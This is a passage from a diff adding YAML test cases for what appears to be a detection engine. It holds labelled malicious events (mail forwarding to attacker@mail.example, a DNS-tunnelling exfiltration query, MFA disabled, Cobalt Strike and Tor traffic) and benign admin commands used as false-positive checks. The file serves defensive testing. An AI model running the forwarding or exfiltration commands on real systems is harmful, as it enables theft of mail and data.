+        type: Root
+        arn: arn:aws:iam::123456789012:root
+      additionalEventData:
+        MFAUsed: 'No'
+      responseElements:
+        ConsoleLogin: Success
+  severity: high
+- id: HO3-087
+  name: Mailbox forwarding rule to an external address
+  techniques:
+  - T1114.003
+  tactic: TA0009
+  events:
+  - title: Mailbox rule
+    event_type: email.admin
+    username: cfo
+    raw_data:
+      operation: New-InboxRule
+      parameters: -Name .. -ForwardTo attacker@mail.example -DeleteMessage $true
+  severity: high
+- id: HO3-088
+  name: Okta MFA policy rule updated to disable MFA
+  techniques:
+  - T1556
+  tactic: TA0006
+  events:
+  - title: Policy update
+    event_type: identity.okta
+    username: adm-okta
+    raw_data:
+      eventType: policy.rule.update
+      target: MFA enrollment policy
+      change: 'enforcement: DISABLED'
+  severity: high
+- id: HO3-089
+  name: RDP allowed from the internet through the firewall
+  techniques:
+  - T1133
+  tactic: TA0001
+  events:
+  - title: Firewall allow
+    event_type: network.firewall.allow
+    source_ip: 203.0.113.55
+    destination_ip: 10.0.5.10
+    destination_port: 3389
+  severity: medium
+- id: HO3-090
+  name: SMB connection to an external address
+  techniques:
+  - T1048
+  tactic: TA0010
+  events:
+  - title: Flow
+    event_type: network.flow
+    source_ip: 10.0.5.22
+    destination_ip: 203.0.113.55
+    destination_port: 445
+    asset_name: ws-fin-02
+  severity: medium
+- id: HO3-091
+  name: Outbound IRC to an external server
+  techniques:
+  - T1071
+  tactic: TA0011
+  events:
+  - title: Flow
+    event_type: network.flow
+    source_ip: 10.0.5.22
+    destination_ip: 203.0.113.60
+    destination_port: 6667
+    asset_name: ws-fin-02
+  severity: medium
+- id: HO3-092
+  name: DNS query with a very long high-entropy label (tunnelling)
+  techniques:
+  - T1071.004
+  tactic: TA0011
+  events:
+  - title: DNS query
+    event_type: network.dns
+    source_ip: 10.0.5.22
+    asset_name: ws-fin-02
+    raw_data:
+      query: dGhpcyBpcyBleGZpbHRyYXRlZCBkYXRhIGZyb20gdGhlIGZpbmFuY2UgdXNlcg0KMDEyMzQ1Njc4OWFiY2RlZg.t.exfil-dns.example
+      query_type: TXT
+  severity: medium
+- id: HO3-093
+  name: Tor relay port used for outbound connection
+  techniques:
+  - T1090.003
+  tactic: TA0011
+  events:
+  - title: Flow
+    event_type: network.flow
+    source_ip: 10.0.5.22
+    destination_ip: 203.0.113.61
+    destination_port: 9001
+    asset_name: ws-fin-02
+  severity: medium
+- id: HO3-094
+  name: IDS signature for Cobalt Strike beacon
+  techniques:
+  - T1071.001
+  tactic: TA0011
+  events:
+  - title: IDS alert
+    event_type: network.ids
+    source_ip: 10.0.5.22
+    destination_ip: 203.0.113.62
+    raw_data:
+      signature: ET MALWARE Cobalt Strike Beacon Observed
+      category: A Network Trojan was detected
+  severity: high
+- id: HB3-001
+  name: Admin starts notepad through WMI
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: wmic.exe
+    command_line: wmic process call create "notepad.exe"
+    username: helpdesk1
+- id: HB3-002
+  name: Backup agent service registered from Program Files
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: sc.exe
+    command_line: sc create VeeamAgent binpath= "C:\Program Files\Veeam\Agent\veeamagent.exe" start= auto
+- id: HB3-003
+  name: Daily backup task registered from an ops directory
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: schtasks.exe
+    command_line: schtasks /create /tn "NightlyBackup" /tr "C:\ops\backup.cmd" /sc daily /st 02:00 /ru SYSTEM
+- id: HB3-004
+  name: Vendor installer writes its Run key under Program Files
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: reg.exe
+    command_line: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Zoom /t REG_SZ /d "C:\Program Files\Zoom\bin\Zoom.exe --autostart" /f
+- id: HB3-005
+  name: Listing local administrators
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: net.exe
+    command_line: net localgroup administrators
+    username: helpdesk1
+- id: HB3-006
+  name: Helpdesk resets a password
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: net.exe
+    command_line: net user jsmith NewTemp#2026 /domain
+    username: helpdesk1
+- id: HB3-007
+  name: Reading the Security log
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: wevtutil.exe
+    command_line: wevtutil qe Security /c:20 /rd:true /f:text
+- id: HB3-008
+  name: vssadmin listing shadow copies
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: vssadmin.exe
+    command_line: vssadmin list shadows
+- id: HB3-009
+  name: wbadmin starting a normal backup
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: wbadmin.exe
+    command_line: 'wbadmin start backup -backupTarget:E: -include:C: -quiet'
+- id: HB3-010
+  name: bcdedit showing the boot configuration
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: bcdedit.exe
+    command_line: bcdedit /enum all
+- id: HB3-011
+  name: Domain trust check by an admin
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: nltest.exe
+    command_line: nltest /domain_trusts
+    username: adm-jones
+- id: HB3-012
+  name: PowerShell inventory script from IT share
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell -File \\fs01\it\scripts\inventory.ps1 -OutDir C:\inventory
+- id: HB3-013
+  name: 7-Zip backing up a project folder
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: 7z.exe
+    command_line: 7z.exe a C:\backups\project-2026-04.7z C:\src\project
+- id: HB3-014
+  name: curl health check
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: curl.exe
+    command_line: curl.exe -fsS https://api.vendor.example/health
+- id: HB3-015
+  name: Developer scp to a staging server
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: dev-ws-3
+    process_name: scp
+    command_line: scp -r ./build deploy@stg-01.corp.local:/srv/app/
+- id: HB3-016
+  name: rsync backup to the NAS
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: rsync
+    command_line: rsync -az /srv/data backup@nas-01.corp.local:/volume1/backups/
+- id: HB3-017
+  name: tar of the application directory for deployment
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: tar
+    command_line: tar czf /var/backups/app-2026-04-01.tgz /srv/app
+- id: HB3-018
+  name: mysqldump scheduled backup to /var/backups
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: db-02
+    process_name: mysqldump
+    command_line: mysqldump --single-transaction --all-databases > /var/backups/db-2026-04-01.sql
+- id: HB3-019
+  name: openssl encrypting a backup with a key file
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: db-02
+    process_name: openssl
+    command_line: openssl enc -aes-256-cbc -pbkdf2 -in /var/backups/db.sql -out /var/backups/db.sql.enc -pass file:/etc/backup.key
+- id: HB3-020
+  name: Developer ssh port forward to an internal database
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: dev-ws-3
+    process_name: ssh
+    command_line: ssh -N -L 5432:db-02.corp.local:5432 jump.corp.local
+- id: HB3-021
+  name: systemctl restart of the web server
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: web-07
+    process_name: systemctl
+    command_line: systemctl restart nginx
+- id: HB3-022
+  name: Administrator adds a sudoers drop-in via visudo
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: visudo
+    command_line: visudo -cf /etc/sudoers.d/deploy
+- id: HB3-023
+  name: Cron job installed by configuration management
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: crontab
+    command_line: crontab /etc/cron.d/puppet-managed
+- id: HB3-024
+  name: Developer adds a key to their own authorized_keys through ssh-copy-id
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: dev-ws-3
+    process_name: ssh-copy-id
+    command_line: ssh-copy-id -i ~/.ssh/id_ed25519.pub deploy@stg-01.corp.local
+- id: HB3-025
+  name: docker run of a normal application image
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: dev-ws-3
+    process_name: docker
+    command_line: docker run -d --name web -p 8080:80 nginx:1.27
+- id: HB3-026
+  name: kubectl listing pods and deployments
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: dev-ws-3
+    process_name: kubectl
+    command_line: kubectl get pods,deploy -n prod
+- id: HB3-027
+  name: kubectl reading a single configmap
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: dev-ws-3
+    process_name: kubectl
+    command_line: kubectl get configmap app-config -n prod -o yaml
+- id: HB3-028
+  name: Pod reading its own namespace file
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: k8s-pod-web
+    process_name: cat
+    command_line: cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+- id: HB3-029
+  name: Compiling a kernel module in the build directory
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: build-01
+    process_name: make
+    command_line: make -C /usr/src/linux-headers-$(uname -r) M=$(pwd) modules
+- id: HB3-030
+  name: journalctl reading recent logs
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: web-07
+    process_name: journalctl
+    command_line: journalctl -u nginx --since "1 hour ago"
+- id: HB3-031
+  name: auditctl listing rules
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: auditctl
+    command_line: auditctl -l
+- id: HB3-032
+  name: dd writing an installer image to a USB stick
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: admin-lap-2
+    process_name: dd
+    command_line: dd if=ubuntu-24.04.iso of=/dev/sdb bs=4M status=progress
+- id: HB3-033
+  name: firewall rule opened by change ticket for the app port
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: netsh.exe
+    command_line: netsh advfirewall firewall add rule name="App HTTPS" dir=in action=allow protocol=TCP localport=8443 program="C:\Program Files\App\app.exe"
+- id: HB3-034
+  name: Windows Defender signature update
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: MpCmdRun.exe
+    command_line: '"C:\Program Files\Windows Defender\MpCmdRun.exe" -SignatureUpdate'
+- id: HB3-035
+  name: Msiexec installing a signed internal package
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: msiexec.exe
+    command_line: msiexec /i \\fs01\software\agent-5.2.msi /qn
+- id: HB3-036
+  name: PowerShell Get-Process inventory
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: powershell.exe
+    command_line: powershell -c "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10"
+- id: HB3-037
+  name: Python virtualenv creation
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: app-03
+    process_name: python3
+    command_line: python3 -m venv /srv/app/.venv
+- id: HB3-038
+  name: Legit certutil hash check
+  events:
+  - title: Process creation
+    event_type: process.start
+    asset_name: srv-hr-04
+    process_name: certutil.exe
+    command_line: certutil -hashfile C:\Installers\agent.msi SHA256
+- id: HB3-039
+  name: Ordinary GET of a product page
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /products/42?utm_source=newsletter
+- id: HB3-040
+  name: Search with quotes and an apostrophe
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /search?q=women's+shoes+size+7
+- id: HB3-041
+  name: Query string with math expression in text
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /blog?title=what+is+7*7+equals
+- id: HB3-042
+  name: Static asset request with version parameter
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /static/app.js?v=20260401
+- id: HB3-043
+  name: API call with a SQL-like word in JSON text
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 198.51.100.140
+    asset_name: web-07
+    raw_data:
+      url: /api/v1/notes
+      method: POST
+      body: '{"text": "please select the best option and update the plan"}'
+- id: HB3-044
+  name: Health probe from the load balancer
+  events:
+  - title: HTTP request
+    event_type: web.request
+    source_ip: 10.0.0.5
+    asset_name: web-07
+    raw_data:
+      url: /healthz
+- id: HB3-045
+  name: Large ordinary DNS query
+  events:
+  - title: DNS query
+    event_type: network.dns
+    source_ip: 10.0.5.22
+    asset_name: ws-fin-02
+    raw_data:
+      query: f1.update.microsoft.com
+      query_type: A
+- id: HB3-046
+  name: HTTPS to a CDN
+  events:
+  - title: Flow
+    event_type: network.flow
+    source_ip: 10.0.5.22
+    destination_ip: 203.0.113.200
+    destination_port: 443
+    asset_name: ws-fin-02
+    raw_data:
+      bytes_out: 52000
+- id: HB3-047
+  name: Console login with MFA from the corporate range
+  events:
+  - adapter: cloudtrail
+    payload:
+      eventName: ConsoleLogin
+      eventSource: signin.amazonaws.com
+      eventTime: '2026-04-01T09:00:00Z'
+      sourceIPAddress: 10.0.0.8
+      userIdentity:
+        type: IAMUser
+        userName: alice
+      additionalEventData:
+        MFAUsed: 'Yes'
+      responseElements:
+        ConsoleLogin: Success
+- id: HB3-048
+  name: Read-only DescribeInstances by a monitoring role
+  events:
+  - adapter: cloudtrail
+    payload:
+      eventName: DescribeInstances
+      eventSource: ec2.amazonaws.com
+      eventTime: '2026-04-01T09:00:00Z'
+      sourceIPAddress: 10.0.0.8
+      userIdentity:
+        type: AssumedRole
+        arn: arn:aws:sts::123456789012:assumed-role/monitoring/session
+- id: HB3-049
+  name: Scheduled S3 sync PutObject
+  events:
+  - adapter: cloudtrail
+    payload:
+      eventName: PutObject
+      eventSource: s3.amazonaws.com
+      eventTime: '2026-04-01T02:00:00Z'
+      sourceIPAddress: 10.0.0.9
+      userIdentity:
+        type: IAMUser
+        userName: backup-bot
+      requestParameters:
+        bucketName: company-backups
+        key: db/2026-04-01.sql.gz
+- id: HB3-050
+  name: Firewall deny of inbound RDP
+  events:
+  - title: Firewall deny
+    event_type: network.firewall.deny
+    source_ip: 203.0.113.55
+    destination_ip: 10.0.5.10
+    destination_port: 3389
+- id: HB3-051
+  name: Successful sign-in at the start of a workday
+  events:
+  - title: Sign-in
+    event_type: authentication.success
+    username: alice
+    source_ip: 10.1.4.20
+    asset_name: ws-alice
